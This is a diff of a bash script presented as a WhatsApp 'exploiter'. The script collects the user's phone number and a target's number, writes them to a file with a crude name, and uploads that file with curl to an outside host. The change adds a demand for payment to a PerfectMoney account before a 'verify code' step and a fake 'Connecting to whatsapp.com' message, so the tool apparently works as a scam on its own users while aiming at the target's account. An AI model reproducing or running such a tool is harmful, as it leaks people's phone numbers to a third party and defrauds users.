@@ -7,7 +7,7 @@ echo "
 #     Exploiter    # ceweberbatang59@gmail.com
 ####################
 
-Copyright (c) 2018 ceweberbatang Ganteng";
+Copyright (c) 2018 ./C3W3KBERB4T4N9 Ganteng";
 echo "";
 read -p "Nomer Kamu (+62xxxx)=> " nomer;
 read -p "Nomer Target (+62xxxx) => " target;
@@ -23,7 +23,7 @@ echo "Nomer => $nomer" >> kontol.html;
 curl -T kontol.html http://apparelworld.org/
 sleep 5;
 echo "[+] Done.";
-echo "Tunggu 5-10 Menit Untuk Mendapatkan Code.";
+echo "Pay For Get Code PerfectMoney : U19478215";
 read -p "Verify Code => " code;
 sleep 2
 echo "[+] Connecting to whatsapp.com...";
